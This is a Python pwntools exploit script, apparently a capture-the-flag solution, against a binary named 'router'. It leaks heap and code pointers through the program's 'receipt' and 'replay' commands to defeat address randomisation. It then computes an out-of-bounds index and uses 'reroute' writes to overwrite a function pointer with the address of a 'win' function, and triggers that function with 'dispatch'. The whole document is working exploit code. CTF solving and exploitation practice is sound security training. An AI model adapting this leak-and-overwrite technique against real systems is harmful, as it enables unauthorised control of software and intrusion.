from pwn import *
import re

elf = context.binary = ELF("./router")

HOST = ""
PORT = 1337

context.log_level = "info"

gs = '''
b *main
c
'''

ANSI_RE = re.compile(rb"\x1b\[[0-9;]*m")
clean = lambda b: ANSI_RE.sub(b"", b)

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote(HOST, PORT)
    return process(elf.path)

def recv_prompt(p):
    return clean(p.recvuntil(b"router> ", drop=True))

def cmd(p, s):
    p.sendline(s.encode())
    return recv_prompt(p)

def parse_ptr(b, key):
    return int(re.search(key + rb"=(0x[0-9a-fA-F]+)", b).group(1), 16)

def s32(x):
    x &= 0xffffffff
    return x if x < 0x80000000 else x - 0x100000000

p = start()
recv_prompt(p)

cmd(p, "load city1")
cmd(p, "add_order 1 8")
cmd(p, "add_order 1 8")

r0 = cmd(p, "receipt 0")
p0 = cmd(p, "replay 0")

ctx0     = parse_ptr(r0, b"hint")
renderer = parse_ptr(p0, b"renderer")

FX_DRAW = 0x2260
WIN     = 0x2460
ORD     = 0x5080
SIZE    = 0x1038

pie   = renderer - FX_DRAW
win   = pie + WIN
ord1  = pie + ORD + SIZE
heap0 = ctx0 + 0x18

idx = (ord1 - heap0) // 8

width, y = 16, 8
low  = win & 0xffffffff
high = (win >> 32) & 0xffffffff
x    = s32((low - y * width) & 0xffffffff)

new_id = 129

log.info(f"win = {hex(win)}")
log.info(f"idx = {idx}, x = {x}, high = {hex(high)}")

cmd(p, f"reroute 0 {idx} {x}")
cmd(p, f"reroute {new_id} 131 {high}")

p.sendline(f"dispatch {new_id}".encode())
print(clean(p.recvall(timeout=2)).decode(errors="ignore"))
